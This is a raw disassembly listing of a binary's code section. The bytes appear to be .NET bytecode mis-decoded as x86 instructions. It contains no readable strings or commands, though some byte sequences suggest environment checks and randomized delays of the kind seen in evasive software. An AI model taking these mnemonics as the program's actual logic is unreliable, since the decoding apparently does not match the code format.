  4025c3:	13 11                	adc    (%ecx),%edx
  4025c5:	13 16                	adc    (%esi),%edx
  4025c7:	72 77                	jb     0x402640
  4025c9:	03 00                	add    (%eax),%eax
  4025cb:	70 a2                	jo     0x40256f
  4025cd:	11 13                	adc    %edx,(%ebx)
  4025cf:	14 14                	adc    $0x14,%al
  4025d1:	16                   	push   %ss
  4025d2:	17                   	pop    %ss
  4025d3:	28 43 00             	sub    %al,0x0(%ebx)
  4025d6:	00 0a                	add    %cl,(%edx)
  4025d8:	11 12                	adc    %edx,(%edx)
  4025da:	14 72                	adc    $0x72,%al
  4025dc:	cf                   	iret
  4025dd:	03 00                	add    (%eax),%eax
  4025df:	70 16                	jo     0x4025f7
  4025e1:	8d 03                	lea    (%ebx),%eax
  4025e3:	00 00                	add    %al,(%eax)
  4025e5:	01 14 14             	add    %edx,(%esp,%edx,1)
  4025e8:	14 17                	adc    $0x17,%al
  4025ea:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4025ee:	0a 26                	or     (%esi),%ah
  4025f0:	14 13                	adc    $0x13,%al
  4025f2:	12 11                	adc    (%ecx),%dl
  4025f4:	0c 19                	or     $0x19,%al
  4025f6:	73 45                	jae    0x40263d
  4025f8:	00 00                	add    %al,(%eax)
  4025fa:	0a 80 28 00 00 04    	or     0x4000028(%eax),%al
  402600:	de 0f                	fimuls (%edi)
  402602:	25 28 25 00 00       	and    $0x2528,%eax
  402607:	0a 13                	or     (%ebx),%dl
  402609:	0d 28 27 00 00       	or     $0x2728,%eax
  40260e:	0a de                	or     %dh,%bl
  402610:	00 28                	add    %ch,(%eax)
  402612:	6a 00                	push   $0x0
  402614:	00 06                	add    %al,(%esi)
  402616:	14 fe                	adc    $0xfe,%al
  402618:	06                   	push   %es
  402619:	1e                   	push   %ds
  40261a:	00 00                	add    %al,(%eax)
  40261c:	06                   	push   %es
  40261d:	73 46                	jae    0x402665
  40261f:	00 00                	add    %al,(%eax)
  402621:	0a 73 47             	or     0x47(%ebx),%dh
  402624:	00 00                	add    %al,(%eax)
  402626:	0a 6f 48             	or     0x48(%edi),%ch
  402629:	00 00                	add    %al,(%eax)
  40262b:	0a 28                	or     (%eax),%ch
  40262d:	28 00                	sub    %al,(%eax)
  40262f:	00 06                	add    %al,(%esi)
  402631:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402634:	00 0a                	add    %cl,(%edx)
  402636:	2c 05                	sub    $0x5,%al
  402638:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  40263c:	06                   	push   %es
  40263d:	14 fe                	adc    $0xfe,%al
  40263f:	06                   	push   %es
  402640:	1f                   	pop    %ds
  402641:	00 00                	add    %al,(%eax)
  402643:	06                   	push   %es
  402644:	73 46                	jae    0x40268c
  402646:	00 00                	add    %al,(%eax)
  402648:	0a 73 47             	or     0x47(%ebx),%dh
  40264b:	00 00                	add    %al,(%eax)
  40264d:	0a 0b                	or     (%ebx),%cl
  40264f:	14 fe                	adc    $0xfe,%al
  402651:	06                   	push   %es
  402652:	20 00                	and    %al,(%eax)
  402654:	00 06                	add    %al,(%esi)
  402656:	73 46                	jae    0x40269e
  402658:	00 00                	add    %al,(%eax)
  40265a:	0a 73 47             	or     0x47(%ebx),%dh
  40265d:	00 00                	add    %al,(%eax)
  40265f:	0a 0c 07             	or     (%edi,%eax,1),%cl
  402662:	6f                   	outsl  %ds:(%esi),(%dx)
  402663:	48                   	dec    %eax
  402664:	00 00                	add    %al,(%eax)
  402666:	0a 08                	or     (%eax),%cl
  402668:	6f                   	outsl  %ds:(%esi),(%dx)
  402669:	48                   	dec    %eax
  40266a:	00 00                	add    %al,(%eax)
  40266c:	0a 08                	or     (%eax),%cl
  40266e:	6f                   	outsl  %ds:(%esi),(%dx)
  40266f:	49                   	dec    %ecx
  402670:	00 00                	add    %al,(%eax)
  402672:	0a 2a                	or     (%edx),%ch
  402674:	01 4c 00 00          	add    %ecx,0x0(%eax,%eax,1)
  402678:	00 00                	add    %al,(%eax)
  40267a:	10 00                	adc    %al,(%eax)
  40267c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40267d:	b7 00                	mov    $0x0,%bh
  40267f:	14 29                	adc    $0x29,%al
  402681:	00 00                	add    %al,(%eax)
  402683:	01 00                	add    %eax,(%eax)
  402685:	00 d8                	add    %bl,%al
  402687:	00 07                	add    %al,(%edi)
  402689:	df 00                	filds  (%eax)
  40268b:	0f 29 00             	movaps %xmm0,(%eax)
  40268e:	00 01                	add    %al,(%ecx)
  402690:	00 00                	add    %al,(%eax)
  402692:	08 01                	or     %al,(%ecx)
  402694:	60                   	pusha
  402695:	68 01 0f 29 00       	push   $0x290f01
  40269a:	00 01                	add    %al,(%ecx)
  40269c:	00 00                	add    %al,(%eax)
  40269e:	77 01                	ja     0x4026a1
  4026a0:	bc 33 02 0f 29       	mov    $0x290f0233,%esp
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	01 00                	add    %eax,(%eax)
  4026a9:	00 42 02             	add    %al,0x2(%edx)
  4026ac:	2c 6e                	sub    $0x6e,%al
  4026ae:	02 0f                	add    (%edi),%cl
  4026b0:	29 00                	sub    %eax,(%eax)
  4026b2:	00 01                	add    %al,(%ecx)
  4026b4:	00 00                	add    %al,(%eax)
  4026b6:	7d 02                	jge    0x4026ba
  4026b8:	f5                   	cmc
  4026b9:	72 03                	jb     0x4026be
  4026bb:	0f 29 00             	movaps %xmm0,(%eax)
  4026be:	00 01                	add    %al,(%ecx)
  4026c0:	1b 30                	sbb    (%eax),%esi
  4026c2:	04 00                	add    $0x0,%al
  4026c4:	fc                   	cld
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 0d 00 00 11 28    	add    %cl,0x28110000
  4026cd:	28 00                	sub    %al,(%eax)
  4026cf:	00 06                	add    %al,(%esi)
  4026d1:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026d4:	00 0a                	add    %cl,(%edx)
  4026d6:	39 ec                	cmp    %ebp,%esp
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	00 73 4a             	add    %dh,0x4a(%ebx)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	0a 0a                	or     (%edx),%cl
  4026e1:	06                   	push   %es
  4026e2:	72 d9                	jb     0x4026bd
  4026e4:	03 00                	add    (%eax),%eax
  4026e6:	70 6f                	jo     0x402757
  4026e8:	4b                   	dec    %ebx
  4026e9:	00 00                	add    %al,(%eax)
  4026eb:	0a 06                	or     (%esi),%al
  4026ed:	17                   	pop    %ss
  4026ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4026ef:	33 00                	xor    (%eax),%eax
  4026f1:	00 0a                	add    %cl,(%edx)
  4026f3:	06                   	push   %es
  4026f4:	72 f7                	jb     0x4026ed
  4026f6:	03 00                	add    (%eax),%eax
  4026f8:	70 7e                	jo     0x402778
  4026fa:	2c 00                	sub    $0x0,%al
  4026fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4026ff:	6b 04 00 70          	imul   $0x70,(%eax,%eax,1),%eax
  402703:	28 28                	sub    %ch,(%eax)
  402705:	00 00                	add    %al,(%eax)
  402707:	0a 6f 37             	or     0x37(%edi),%ch
  40270a:	00 00                	add    %al,(%eax)
  40270c:	0a 06                	or     (%esi),%al
  40270e:	28 38                	sub    %bh,(%eax)
  402710:	00 00                	add    %al,(%eax)
  402712:	0a 6f 39             	or     0x39(%edi),%ch
  402715:	00 00                	add    %al,(%eax)
  402717:	0a 06                	or     (%esi),%al
  402719:	72 6f                	jb     0x40278a
  40271b:	04 00                	add    $0x0,%al
  40271d:	70 28                	jo     0x402747
  40271f:	4c                   	dec    %esp
  402720:	00 00                	add    %al,(%eax)
  402722:	0a 6f 4d             	or     0x4d(%edi),%ch
  402725:	00 00                	add    %al,(%eax)
  402727:	0a 6f 4e             	or     0x4e(%edi),%ch
  40272a:	00 00                	add    %al,(%eax)
  40272c:	0a 72 6b             	or     0x6b(%edx),%dh
  40272f:	04 00                	add    $0x0,%al
  402731:	70 28                	jo     0x40275b
  402733:	28 00                	sub    %al,(%eax)
  402735:	00 0a                	add    %cl,(%edx)
  402737:	6f                   	outsl  %ds:(%esi),(%dx)
  402738:	37                   	aaa
  402739:	00 00                	add    %al,(%eax)
  40273b:	0a 06                	or     (%esi),%al
  40273d:	28 38                	sub    %bh,(%eax)
  40273f:	00 00                	add    %al,(%eax)
  402741:	0a 6f 39             	or     0x39(%edi),%ch
  402744:	00 00                	add    %al,(%eax)
  402746:	0a 06                	or     (%esi),%al
  402748:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  40274e:	0c 08                	or     $0x8,%al
  402750:	16                   	push   %ss
  402751:	72 f7                	jb     0x40274a
  402753:	03 00                	add    (%eax),%eax
  402755:	70 a2                	jo     0x4026f9
  402757:	08 17                	or     %dl,(%edi)
  402759:	7e 0e                	jle    0x402769
  40275b:	00 00                	add    %al,(%eax)
  40275d:	04 a2                	add    $0xa2,%al
  40275f:	08 18                	or     %bl,(%eax)
  402761:	72 23                	jb     0x402786
  402763:	02 00                	add    (%eax),%al
  402765:	70 a2                	jo     0x402709
  402767:	08 19                	or     %bl,(%ecx)
  402769:	7e 0f                	jle    0x40277a
  40276b:	00 00                	add    %al,(%eax)
  40276d:	04 a2                	add    $0xa2,%al
  40276f:	08 1a                	or     %bl,(%edx)
  402771:	72 6b                	jb     0x4027de
  402773:	04 00                	add    $0x0,%al
  402775:	70 a2                	jo     0x402719
  402777:	08 28                	or     %ch,(%eax)
  402779:	36 00 00             	add    %al,%ss:(%eax)
  40277c:	0a 6f 37             	or     0x37(%edi),%ch
  40277f:	00 00                	add    %al,(%eax)
  402781:	0a 06                	or     (%esi),%al
  402783:	28 38                	sub    %bh,(%eax)
  402785:	00 00                	add    %al,(%eax)
  402787:	0a 6f 39             	or     0x39(%edi),%ch
  40278a:	00 00                	add    %al,(%eax)
  40278c:	0a 06                	or     (%esi),%al
  40278e:	72 6f                	jb     0x4027ff
  402790:	04 00                	add    $0x0,%al
  402792:	70 7e                	jo     0x402812
  402794:	0f 00 00             	sldt   (%eax)
  402797:	04 28                	add    $0x28,%al
  402799:	4f                   	dec    %edi
  40279a:	00 00                	add    %al,(%eax)
  40279c:	0a 72 6b             	or     0x6b(%edx),%dh
  40279f:	04 00                	add    $0x0,%al
  4027a1:	70 28                	jo     0x4027cb
  4027a3:	28 00                	sub    %al,(%eax)
  4027a5:	00 0a                	add    %cl,(%edx)
  4027a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a8:	37                   	aaa
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	0a 06                	or     (%esi),%al
  4027ad:	28 38                	sub    %bh,(%eax)
  4027af:	00 00                	add    %al,(%eax)
  4027b1:	0a 6f 39             	or     0x39(%edi),%ch
  4027b4:	00 00                	add    %al,(%eax)
  4027b6:	0a de                	or     %dh,%bl
  4027b8:	0e                   	push   %cs
  4027b9:	25 28 25 00 00       	and    $0x2528,%eax
  4027be:	0a 0b                	or     (%ebx),%cl
  4027c0:	28 27                	sub    %ah,(%edi)
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	0a de                	or     %dh,%bl
  4027c6:	00 2a                	add    %ch,(%edx)
  4027c8:	01 10                	add    %edx,(%eax)
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	00 00                	add    %al,(%eax)
  4027ce:	0f 00 de             	ltr    %esi
  4027d1:	ed                   	in     (%dx),%eax
  4027d2:	00 0e                	add    %cl,(%esi)
  4027d4:	29 00                	sub    %eax,(%eax)
  4027d6:	00 01                	add    %al,(%ecx)
  4027d8:	c2 28 19             	ret    $0x1928
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	06                   	push   %es
  4027de:	2d 07 28 1a 00       	sub    $0x1a2807,%eax
  4027e3:	00 06                	add    %al,(%esi)
  4027e5:	2c 02                	sub    $0x2,%al
  4027e7:	2b 07                	sub    (%edi),%eax
  4027e9:	28 1b                	sub    %bl,(%ebx)
  4027eb:	00 00                	add    %al,(%eax)
  4027ed:	06                   	push   %es
  4027ee:	2c 02                	sub    $0x2,%al
  4027f0:	2b 07                	sub    (%edi),%eax
  4027f2:	28 18                	sub    %bl,(%eax)
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	06                   	push   %es
  4027f7:	2c 02                	sub    $0x2,%al
  4027f9:	2b 07                	sub    (%edi),%eax
  4027fb:	28 17                	sub    %dl,(%edi)
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	06                   	push   %es
  402800:	2c 06                	sub    $0x6,%al
  402802:	14 28                	adc    $0x28,%al
  402804:	50                   	push   %eax
  402805:	00 00                	add    %al,(%eax)
  402807:	0a 2a                	or     (%edx),%ch
  402809:	00 00                	add    %al,(%eax)
  40280b:	00 1b                	add    %bl,(%ebx)
  40280d:	30 02                	xor    %al,(%edx)
  40280f:	00 32                	add    %dh,(%edx)
  402811:	00 00                	add    %al,(%eax)
  402813:	00 0e                	add    %cl,(%esi)
  402815:	00 00                	add    %al,(%eax)
  402817:	11 73 51             	adc    %esi,0x51(%ebx)
  40281a:	00 00                	add    %al,(%eax)
  40281c:	0a 72 e9             	or     -0x17(%edx),%dh
  40281f:	04 00                	add    $0x0,%al
  402821:	70 6f                	jo     0x402892
  402823:	52                   	push   %edx
  402824:	00 00                	add    %al,(%eax)
  402826:	0a 0b                	or     (%ebx),%cl
  402828:	07                   	pop    %es
  402829:	72 37                	jb     0x402862
  40282b:	05 00 70 6f 53       	add    $0x536f7000,%eax
  402830:	00 00                	add    %al,(%eax)
  402832:	0a 0a                	or     (%edx),%cl
  402834:	de 12                	ficoms (%edx)
  402836:	de 0c 28             	fimuls (%eax,%ebp,1)
  402839:	25 00 00 0a 28       	and    $0x280a0000,%eax
  40283e:	27                   	daa
  40283f:	00 00                	add    %al,(%eax)
  402841:	0a de                	or     %dh,%bl
  402843:	00 16                	add    %dl,(%esi)
  402845:	0a 2b                	or     (%ebx),%ch
  402847:	00 06                	add    %al,(%esi)
  402849:	2a 00                	sub    (%eax),%al
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	10 00                	adc    %al,(%eax)
  40284f:	00 00                	add    %al,(%eax)
  402851:	00 00                	add    %al,(%eax)
  402853:	00 20                	add    %ah,(%eax)
  402855:	20 00                	and    %al,(%eax)
  402857:	0c 29                	or     $0x29,%al
  402859:	00 00                	add    %al,(%eax)
  40285b:	01 1b                	add    %ebx,(%ebx)
  40285d:	30 02                	xor    %al,(%edx)
  40285f:	00 33                	add    %dh,(%ebx)
  402861:	00 00                	add    %al,(%eax)
  402863:	00 0f                	add    %cl,(%edi)
  402865:	00 00                	add    %al,(%eax)
  402867:	11 73 54             	adc    %esi,0x54(%ebx)
  40286a:	00 00                	add    %al,(%eax)
  40286c:	0a 6f 55             	or     0x55(%edi),%ch
  40286f:	00 00                	add    %al,(%eax)
  402871:	0a 6f 56             	or     0x56(%edi),%ch
  402874:	00 00                	add    %al,(%eax)
  402876:	0a 72 41             	or     0x41(%edx),%dh
  402879:	05 00 70 6f 53       	add    $0x536f7000,%eax
  40287e:	00 00                	add    %al,(%eax)
  402880:	0a 2c 04             	or     (%esp,%eax,1),%ch
  402883:	17                   	pop    %ss
  402884:	0a de                	or     %dh,%bl
  402886:	12 de                	adc    %dh,%bl
  402888:	0c 28                	or     $0x28,%al
  40288a:	25 00 00 0a 28       	and    $0x280a0000,%eax
  40288f:	27                   	daa
  402890:	00 00                	add    %al,(%eax)
  402892:	0a de                	or     %dh,%bl
  402894:	00 16                	add    %dl,(%esi)
  402896:	0a 2b                	or     (%ebx),%ch
  402898:	00 06                	add    %al,(%esi)
  40289a:	2a 00                	sub    (%eax),%al
  40289c:	01 10                	add    %edx,(%eax)
  40289e:	00 00                	add    %al,(%eax)
  4028a0:	00 00                	add    %al,(%eax)
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	21 21                	and    %esp,(%ecx)
  4028a6:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	01 1b                	add    %ebx,(%ebx)
  4028ad:	30 07                	xor    %al,(%edi)
  4028af:	00 48 01             	add    %cl,0x1(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	10 00                	adc    %al,(%eax)
  4028b6:	00 11                	add    %dl,(%ecx)
  4028b8:	72 47                	jb     0x402901
  4028ba:	05 00 70 73 57       	add    $0x57737000,%eax
  4028bf:	00 00                	add    %al,(%eax)
  4028c1:	0a 0b                	or     (%ebx),%cl
  4028c3:	07                   	pop    %es
  4028c4:	14 72                	adc    $0x72,%al
  4028c6:	8d 05 00 70 16 8d    	lea    0x8d167000,%eax
  4028cc:	03 00                	add    (%eax),%eax
  4028ce:	00 01                	add    %al,(%ecx)
  4028d0:	14 14                	adc    $0x14,%al
  4028d2:	14 28                	adc    $0x28,%al
  4028d4:	41                   	inc    %ecx
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	0a 28                	or     (%eax),%ch
  4028d9:	11 00                	adc    %eax,(%eax)
  4028db:	00 0a                	add    %cl,(%edx)
  4028dd:	0d 09 74 41 00       	or     $0x417409,%eax
  4028e2:	00 01                	add    %al,(%ecx)
  4028e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4028e5:	58                   	pop    %eax
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	0a 13                	or     (%ebx),%dl
  4028ea:	05 38 b6 00 00       	add    $0xb638,%eax
  4028ef:	00 11                	add    %dl,(%ecx)
  4028f1:	05 6f 59 00 00       	add    $0x596f,%eax
  4028f6:	0a 28                	or     (%eax),%ch
  4028f8:	11 00                	adc    %eax,(%eax)
  4028fa:	00 0a                	add    %cl,(%edx)
  4028fc:	0c 08                	or     $0x8,%al
  4028fe:	17                   	pop    %ss
  4028ff:	8d 03                	lea    (%ebx),%eax
  402901:	00 00                	add    %al,(%eax)
  402903:	01 13                	add    %edx,(%ebx)
  402905:	06                   	push   %es
  402906:	11 06                	adc    %eax,(%esi)
  402908:	16                   	push   %ss
  402909:	72 95                	jb     0x4028a0
  40290b:	05 00 70 a2 11       	add    $0x11a27000,%eax
  402910:	06                   	push   %es
  402911:	14 28                	adc    $0x28,%al
  402913:	5a                   	pop    %edx
  402914:	00 00                	add    %al,(%eax)
  402916:	0a 6f 15             	or     0x15(%edi),%ch
  402919:	00 00                	add    %al,(%eax)
  40291b:	0a 6f 56             	or     0x56(%edi),%ch
  40291e:	00 00                	add    %al,(%eax)
  402920:	0a 13                	or     (%ebx),%dl
  402922:	04 11                	add    $0x11,%al
  402924:	04 72                	add    $0x72,%al
  402926:	af                   	scas   %es:(%edi),%eax
  402927:	05 00 70 16 28       	add    $0x28167000,%eax
  40292c:	5b                   	pop    %ebx
  40292d:	00 00                	add    %al,(%eax)
  40292f:	0a 16                	or     (%esi),%dl
  402931:	33 32                	xor    (%edx),%esi
  402933:	08 17                	or     %dl,(%edi)
  402935:	8d 03                	lea    (%ebx),%eax
  402937:	00 00                	add    %al,(%eax)
  402939:	01 13                	add    %edx,(%ebx)
  40293b:	06                   	push   %es
  40293c:	11 06                	adc    %eax,(%esi)
  40293e:	16                   	push   %ss
  40293f:	72 db                	jb     0x40291c
  402941:	05 00 70 a2 11       	add    $0x11a27000,%eax
  402946:	06                   	push   %es
  402947:	14 28                	adc    $0x28,%al
  402949:	5a                   	pop    %edx
  40294a:	00 00                	add    %al,(%eax)
  40294c:	0a 6f 15             	or     0x15(%edi),%ch
  40294f:	00 00                	add    %al,(%eax)
  402951:	0a 6f 5c             	or     0x5c(%edi),%ch
  402954:	00 00                	add    %al,(%eax)
  402956:	0a 72 e7             	or     -0x19(%edx),%dh
  402959:	05 00 70 6f 53       	add    $0x536f7000,%eax
  40295e:	00 00                	add    %al,(%eax)
  402960:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402963:	2b 0e                	sub    (%esi),%ecx
  402965:	11 04 72             	adc    %eax,(%edx,%esi,2)
  402968:	f7 05 00 70 6f 53 00 	testl  $0x2c0a0000,0x536f7000
  40296f:	00 0a 2c 
  402972:	02 2b                	add    (%ebx),%ch
  402974:	2d 08 17 8d 03       	sub    $0x38d1708,%eax
  402979:	00 00                	add    %al,(%eax)
  40297b:	01 13                	add    %edx,(%ebx)
  40297d:	07                   	pop    %es
  40297e:	11 07                	adc    %eax,(%edi)
  402980:	16                   	push   %ss
  402981:	72 db                	jb     0x40295e
  402983:	05 00 70 a2 11       	add    $0x11a27000,%eax
  402988:	07                   	pop    %es
  402989:	14 28                	adc    $0x28,%al
  40298b:	5a                   	pop    %edx
  40298c:	00 00                	add    %al,(%eax)
  40298e:	0a 6f 15             	or     0x15(%edi),%ch
  402991:	00 00                	add    %al,(%eax)
  402993:	0a 72 05             	or     0x5(%edx),%dh
  402996:	06                   	push   %es
  402997:	00 70 16             	add    %dh,0x16(%eax)
  40299a:	28 5b 00             	sub    %bl,0x0(%ebx)
  40299d:	00 0a                	add    %cl,(%edx)
  40299f:	16                   	push   %ss
  4029a0:	33 04 17             	xor    (%edi,%edx,1),%eax
  4029a3:	0a de                	or     %dh,%bl
  4029a5:	58                   	pop    %eax
  4029a6:	11 05 6f 5d 00 00    	adc    %eax,0x5d6f
  4029ac:	0a 3a                	or     (%edx),%bh
  4029ae:	3e ff                	ds (bad)
  4029b0:	ff                   	(bad)
  4029b1:	ff                   	lcall  (bad)
  4029b2:	de 16                	ficoms (%esi)
  4029b4:	11 05 75 43 00 00    	adc    %eax,0x4375
  4029ba:	01 2c 0c             	add    %ebp,(%esp,%ecx,1)
  4029bd:	11 05 75 43 00 00    	adc    %eax,0x4375
  4029c3:	01 6f 5e             	add    %ebp,0x5e(%edi)
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a dc                	or     %ah,%bl
  4029ca:	de 0f                	fimuls (%edi)
  4029cc:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  4029cf:	09 74 43 00          	or     %esi,0x0(%ebx,%eax,2)
  4029d3:	00 01                	add    %al,(%ecx)
  4029d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d6:	5e                   	pop    %esi
  4029d7:	00 00                	add    %al,(%eax)
  4029d9:	0a dc                	or     %ah,%bl
  4029db:	de 0f                	fimuls (%edi)
  4029dd:	07                   	pop    %es
  4029de:	2c 0b                	sub    $0xb,%al
  4029e0:	07                   	pop    %es
  4029e1:	74 43                	je     0x402a26
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	01 6f 5e             	add    %ebp,0x5e(%edi)
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a dc                	or     %ah,%bl
  4029ec:	de 0c 28             	fimuls (%eax,%ebp,1)
  4029ef:	25 00 00 0a 28       	and    $0x280a0000,%eax
  4029f4:	27                   	daa
  4029f5:	00 00                	add    %al,(%eax)
  4029f7:	0a de                	or     %dh,%bl
  4029f9:	00 16                	add    %dl,(%esi)
  4029fb:	0a 2b                	or     (%ebx),%ch
  4029fd:	00 06                	add    %al,(%esi)
  4029ff:	2a 41 64             	sub    0x64(%ecx),%al
  402a02:	00 00                	add    %al,(%eax)
  402a04:	02 00                	add    (%eax),%al
  402a06:	00 00                	add    %al,(%eax)
  402a08:	26 00 00             	add    %al,%es:(%eax)
  402a0b:	00 d6                	add    %dl,%dh
  402a0d:	00 00                	add    %al,(%eax)
  402a0f:	00 fc                	add    %bh,%ah
  402a11:	00 00                	add    %al,(%eax)
  402a13:	00 16                	add    %dl,(%esi)
  402a15:	00 00                	add    %al,(%eax)
  402a17:	00 00                	add    %al,(%eax)
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	00 02                	add    %al,(%edx)
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	00 26                	add    %ah,(%esi)
  402a21:	00 00                	add    %al,(%eax)
  402a23:	00 ee                	add    %ch,%dh
  402a25:	00 00                	add    %al,(%eax)
  402a27:	00 14 01             	add    %dl,(%ecx,%eax,1)
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	0f 00 00             	sldt   (%eax)
  402a2f:	00 00                	add    %al,(%eax)
  402a31:	00 00                	add    %al,(%eax)
  402a33:	00 02                	add    %al,(%edx)
  402a35:	00 00                	add    %al,(%eax)
  402a37:	00 0b                	add    %cl,(%ebx)
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	00 1a                	add    %bl,(%edx)
  402a3d:	01 00                	add    %eax,(%eax)
  402a3f:	00 25 01 00 00 0f    	add    %ah,0xf000001
	...
  402a51:	00 00                	add    %al,(%eax)
  402a53:	00 36                	add    %dh,(%esi)
  402a55:	01 00                	add    %eax,(%eax)
  402a57:	00 36                	add    %dh,(%esi)
  402a59:	01 00                	add    %eax,(%eax)
  402a5b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a5e:	00 00                	add    %al,(%eax)
  402a60:	29 00                	sub    %eax,(%eax)
  402a62:	00 01                	add    %al,(%ecx)
  402a64:	1b 30                	sbb    (%eax),%esi
  402a66:	02 00                	add    (%eax),%al
  402a68:	31 00                	xor    %eax,(%eax)
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	11 00                	adc    %eax,(%eax)
  402a6e:	00 11                	add    %dl,(%ecx)
  402a70:	16                   	push   %ss
  402a71:	0b 28                	or     (%eax),%ebp
  402a73:	4c                   	dec    %esp
  402a74:	00 00                	add    %al,(%eax)
  402a76:	0a 6f 5f             	or     0x5f(%edi),%ch
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	0a 12                	or     (%edx),%dl
  402a7d:	01 28                	add    %ebp,(%eax)
  402a7f:	1d 00 00 06 26       	sbb    $0x26060000,%eax
  402a84:	07                   	pop    %es
  402a85:	0a de                	or     %dh,%bl
  402a87:	17                   	pop    %ss
  402a88:	de 15 28 25 00 00    	ficoms 0x2528
  402a8e:	0a 07                	or     (%edi),%al
  402a90:	0a 28                	or     (%eax),%ch
  402a92:	27                   	daa
  402a93:	00 00                	add    %al,(%eax)
  402a95:	0a de                	or     %dh,%bl
  402a97:	07                   	pop    %es
  402a98:	28 27                	sub    %ah,(%edi)
  402a9a:	00 00                	add    %al,(%eax)
  402a9c:	0a de                	or     %dh,%bl
  402a9e:	00 06                	add    %al,(%esi)
  402aa0:	2a 00                	sub    (%eax),%al
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	01 10                	add    %edx,(%eax)
  402aa6:	00 00                	add    %al,(%eax)
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	02 00                	add    (%eax),%al
  402aac:	18 1a                	sbb    %bl,(%edx)
  402aae:	00 15 29 00 00 01    	add    %dl,0x1000029
  402ab4:	1b 30                	sbb    (%eax),%esi
  402ab6:	02 00                	add    (%eax),%al
  402ab8:	38 00                	cmp    %al,(%eax)
  402aba:	00 00                	add    %al,(%eax)
  402abc:	12 00                	adc    (%eax),%al
  402abe:	00 11                	add    %dl,(%ecx)
  402ac0:	72 1b                	jb     0x402add
  402ac2:	06                   	push   %es
  402ac3:	00 70 28             	add    %dh,0x28(%eax)
  402ac6:	1c 00                	sbb    $0x0,%al
  402ac8:	00 06                	add    %al,(%esi)
  402aca:	0b 12                	or     (%edx),%edx
  402acc:	01 28                	add    %ebp,(%eax)
  402ace:	60                   	pusha
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	0a 16                	or     (%esi),%dl
  402ad3:	2e 06                	cs push %es
  402ad5:	17                   	pop    %ss
  402ad6:	0a de                	or     %dh,%bl
  402ad8:	1d 2b 04 16 0a       	sbb    $0xa16042b,%eax
  402add:	de 17                	ficoms (%edi)
  402adf:	de 15 28 25 00 00    	ficoms 0x2528
  402ae5:	0a 16                	or     (%esi),%dl
  402ae7:	0a 28                	or     (%eax),%ch
  402ae9:	27                   	daa
  402aea:	00 00                	add    %al,(%eax)
  402aec:	0a de                	or     %dh,%bl
  402aee:	07                   	pop    %es
  402aef:	28 27                	sub    %ah,(%edi)
  402af1:	00 00                	add    %al,(%eax)
  402af3:	0a de                	or     %dh,%bl
  402af5:	00 06                	add    %al,(%esi)
  402af7:	2a 01                	sub    (%ecx),%al
  402af9:	10 00                	adc    %al,(%eax)
  402afb:	00 00                	add    %al,(%eax)
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 21                	add    %ah,(%ecx)
  402b01:	21 00                	and    %eax,(%eax)
  402b03:	15 29 00 00 01       	adc    $0x1000029,%eax
  402b08:	22 28                	and    (%eax),%ch
  402b0a:	49                   	dec    %ecx
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	06                   	push   %es
  402b0e:	2b 00                	sub    (%eax),%eax
  402b10:	2a 00                	sub    (%eax),%al
  402b12:	00 00                	add    %al,(%eax)
  402b14:	26 28 66 00          	sub    %ah,%es:0x0(%esi)
  402b18:	00 06                	add    %al,(%esi)
  402b1a:	26 2b 00             	sub    %es:(%eax),%eax
  402b1d:	2a 00                	sub    (%eax),%al
  402b1f:	00 ee                	add    %ch,%dh
  402b21:	2b 35 73 61 00 00    	sub    0x6173,%esi
  402b27:	0a 20                	or     (%eax),%ah
  402b29:	b8 0b 00 00 20       	mov    $0x2000000b,%eax
  402b2e:	10 27                	adc    %ah,(%edi)
  402b30:	00 00                	add    %al,(%eax)
  402b32:	6f                   	outsl  %ds:(%esi),(%dx)
  402b33:	62 00                	bound  %eax,(%eax)
  402b35:	00 0a                	add    %cl,(%edx)
  402b37:	28 22                	sub    %ah,(%edx)
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	0a 7e 12             	or     0x12(%esi),%bh
  402b3e:	00 00                	add    %al,(%eax)
  402b40:	04 2d                	add    $0x2d,%al
  402b42:	0a 28                	or     (%eax),%ch
  402b44:	31 00                	xor    %eax,(%eax)
  402b46:	00 06                	add    %al,(%esi)
